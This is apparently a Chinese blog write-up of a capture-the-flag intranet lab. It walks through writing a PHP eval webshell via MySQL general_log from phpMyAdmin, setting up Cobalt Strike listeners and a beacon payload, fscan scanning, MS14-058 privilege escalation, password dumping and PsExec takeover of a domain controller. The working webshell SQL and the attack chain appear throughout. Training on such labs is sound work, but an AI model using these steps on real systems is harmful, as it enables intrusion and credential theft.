---
title: 红日靶场1 打靶日志
date: 2026-11-08 21:20:00
updated: 2026-11-08 21:20:00
categories:
  - 打靶日志
tags:
  - 内网渗透
  - 靶场
  - Cobalt Strike
  - 域渗透
  - Fscan
  - PsExec
  - WebShell
cover: /img/mhwgon-banner.svg
description: 无境在线内网靶场第一关：从 phpstudy 探针到 MySQL 日志写马，再经 CS 上线、提权、fscan 横向，最终 PsExec 拿下域控。
---

无境的在线内网靶场

{% asset_img img1.jpg %}

目标地址192.168.111.20

本地地址:192.168.111.25 (也就是木马能会连的地址）

Openvpn地址：10.8.0.6（相当于服务器地址）

开启服务端的时候要./teamserver 10.8.0.6 12345

核心原因在于：启动参数需要的是你本机真实存在的、能用于绑定的网卡地址，而 10.8.0.6 正是你连接 VPN 后系统实际生成的隧道接口 IP。

## 为什么是 10.8.0.6 而不是 192.168.111.25？

这涉及到 Cobalt Strike 启动时的一个底层逻辑：./teamserver &lt;IP&gt; 这个命令，本质上是让 TeamServer 服务绑定到本机某一张网卡上来监听客户端的连接。

这里可以看到 sudo openvpn ...之后会多出来一张网卡

{% asset_img img2.jpg %}

192.168.111.25 是“靶场视角”的地址：这个地址是靶场网关在内部网络里分配给你的“身份”。但在你自己的 Kali 系统里，你用 ifconfig 是看不到这个地址的，它并没有真实配置在你的网卡上。如果 TeamServer 试图绑定一个本机不存在的 IP，就会启动失败。

10.8.0.6 是“系统视角”的地址：当你连上 VPN 后，系统会创建一个虚拟网卡（比如 tun0），并给它分配一个地址，10.8.0.6 就是这张网卡的真实 IP。TeamServer 绑定这个地址，才能正常启动并接受你本地 CS 客户端的连接。

## 总结一下两者的分工

你可以这样理解：10.8.0.6 负责“把服务跑起来”，192.168.111.25 负责“让木马连回来”。

启动 TeamServer 用 10.8.0.6：解决的是“服务端如何在你自己的 Kali 上成功监听”的问题。

设置监听器 / 生成木马用 192.168.111.25：解决的是“靶场里的目标机器如何找到你”的问题。木马在目标机器上运行后，会拿着 192.168.111.25 这个地址，通过 VPN 通道回连到你的 Kali。

所以，在无境靶场里操作时，不用太纠结这个 10.8.0.6。启动服务端时用它只是为了本地服务能正常跑起来，而后续所有涉及“上线”的配置，认准靶场页面给你的“本机地址” 192.168.111.25 就对了

监听器里的“Host”要填木马能回连的地址：在 CS 里设置监听器时，那个“Host”地址是给木马看的。木马在目标机器上运行后，会去连接你填的这个地址。所以必须填靶场视角下你的地址 192.168.111.25，这样木马才能沿着 VPN 通道成功回连到你的 CS （CS上线的关键点）

话不多说，开始打靶

直接访问192.168.111.20发现web页面是phpstudy探针，怀疑有phpmyadmin这个管理php数据库的web页面，进行目录扫描

PHPstudy探针 是一个用于检测和显示服务器配置的工具，特别是在开发过程中非常有用。它基于 phpinfo() 函数，但增加了一些额外的功能和信息。通过探针，开发者可以方便地查看服务器的各项参数、PHP已编译模块、PHP相关参数、组件支持和数据库支持等信息。

MYSQL日志写马是一种通过 MySQL 的日志功能将恶意代码写入目标服务器的技术，通常用于获取 WebShell。以下是实现日志写马的步骤和条件。

示例

```text
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'D:/phpStudy/PHPTutorial/WWW/shell.php';
SELECT '<?php @eval($_POST["cmd"]); ?>';
```

上述代码会将一句话木马写入指定路径的日志文件。

条件与步骤

开启日志功能 确保 general_log 全局变量为 ON，并设置日志文件路径为目标目录（如 Web 目录）。

```text
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = 'D:/phpStudy/PHPTutorial/WWW/shell.php';
```

写入恶意代码 使用 SELECT 语句将木马代码写入日志文件。

无论sql语句是否正确都会记录到日志里面，那么我们设置一条带有恶意代码的sql语句就可以被记录到php日志文件里面，构成php马

```text
SELECT '<?php @eval($_POST["cmd"]); ?>';
```

路径权限 确保目标路径具有写权限，并且路径正确（如 D:/phpStudy/PHPTutorial/WWW/）。

secure_file_priv 配置 检查 secure_file_priv 参数是否允许写入目标目录。 如果为空 ("")，可以写入任意目录。 如果为特定路径，则只能写入该路径。 如果为 NULL，则无法写入文件。

注意事项 日志文件必须以 .php 为后缀，以便被解析为 PHP 文件。 如果使用堆叠注入，需要后台支持 mysqli_multi_query()。

{% asset_img img3.jpg %}

{% asset_img img4.jpg %}

直接弱密码探测进入到管理数据库的后台，我们可以尝试通过日志写shell进入内网

{% asset_img img5.jpg %}

发现服务器路径

{% asset_img img6.jpg %}

写日志功能为关闭状态需要开启

{% asset_img img7.jpg %}

### 日志设置

#### 设置文件位置

www目录是phpstudy映射到公网的目录，这里的文件如果不做限制，我们是可以访问到的,所以弄到这下面我们就可以访问到这个马

```text
set global general_log_file ='C:\\phpStudy\\WWW\\shell.php' ;
```

{% asset_img img8.jpg %}

查看

```text
show variables like '%general%';
```

#### 开启读写功能

```text
SET GLOBAL general_log='on';
```

查看

```text
show variables like '%general%';
```

{% asset_img img9.jpg %}

读写功能已经打开，日志文件设置到了web目录下的shell.php

```text
SELECT '<?php eval($_POST[cmd]);?>';
```

{% asset_img img10.jpg %}

访问webshell，链接上蚁剑

{% asset_img img11.jpg %}

权限很普通，尝试提权到system

先把权限转移到CS上面方便后面提权和拿域控的操作

打开kali

把vpn配置移到kali中，在本机中关闭vpn，不然会混乱

```text
Sudo openvpn 10263.ovpn启动连接vpn
```

{% asset_img img12.jpg %}

获得一张虚拟网卡10.8.0.6

{% asset_img img13.jpg %}

将windows本机上的CS用SCP转移到kali上面去

后启动服务端

{% asset_img img14.jpg %}

```text
./teamserver 10.8.0.6 12345
```

后启动客户端

{% asset_img img15.jpg %}

{% asset_img img16.jpg %}

后先设置一个监听器

{% asset_img img17.jpg %}

{% asset_img img18.jpg %}

后生成木马载荷

{% asset_img img19.jpg %}

{% asset_img img20.jpg %}

放在桌面上面

{% asset_img img21.jpg %}

用哥斯拉godsilla连接上webshell

找到哥斯拉目录

Java -jar godsilla启动

{% asset_img img22.jpg %}

上传木马载荷HR1.exe

{% asset_img img23.jpg %}

执行启动木马，CS等待回连

{% asset_img img24.jpg %}

可以看到回连成功了

{% asset_img img25.jpg %}

执行命令看看一下基础的情况，该主机在不在域内

在域内的话DNS这里是有内容的，类似这样

{% asset_img img26.jpg %}

{% asset_img img27.jpg %}

可以看到在god.org内

找到三张网卡

192.168.111.20

169.254.129.186

192.168.52.143

第一张即边缘主机

{% asset_img img28.jpg %}

Ping 一下这个god.org

发现域控主机应该是192.168.52.138

{% asset_img img29.jpg %}

上传fscan扫描这个域网段的信息进行内网信息手机

```text
Fscan -h 192.168.52.0/24
```

{% asset_img img30.jpg %}

{% asset_img img31.jpg %}

发现192.168.52.138存在永恒之蓝漏洞，且为win 2008 R2

{% asset_img img32.jpg %}

利用MS14-058进行提权

{% asset_img img33.jpg %}

成功提权

{% asset_img img34.jpg %}

抓取铭文密码

{% asset_img img35.jpg %}

可以发现域控的密码，有明文密码，可以通过 CS 的 jump 命令，利用现有的 Beacon 作为跳板，直接向域控发起攻击

{% asset_img img36.jpg %}

利用已经提权的这个去进行对域控那个网段进行端口扫描

{% asset_img img37.jpg %}

获得几个目标主机

{% asset_img img38.jpg %}

进行psexec

{% asset_img img39.jpg %}

需要一个域控能访问到的回连的主机

{% asset_img img40.jpg %}

这里选择192.168.52.143

Session选择权限较低的那个建立监听

点击psexec

{% asset_img img41.jpg %}

{% asset_img img42.jpg %}

成功上线域控，拿到域控

{% asset_img img43.jpg %}

（让跳板机通过 PsExec 去攻击域控（192.168.52.138）。域控接收到指令后，会尝试回连你的 CS 服务端。

域控在 192.168.52.x 这个内网里，它根本路由不到 192.168.111.25 这个地址。

如果你在这里填了之前的监听器，域控上的木马会一直尝试连接但连不上，最后导致横向移动失败（或者显示连接超时）。

## 整一个“本地监听”

你有两种方式来解决这个问题，核心都是为了让域控能“原路返回”找到你：

### 方法：使用“中转”监听器，如上

根据题目提示查找flag

{% asset_img img44.jpg %}

拿到flag

拿到flag

{% asset_img img45.jpg %}

{% asset_img img46.jpg %}

)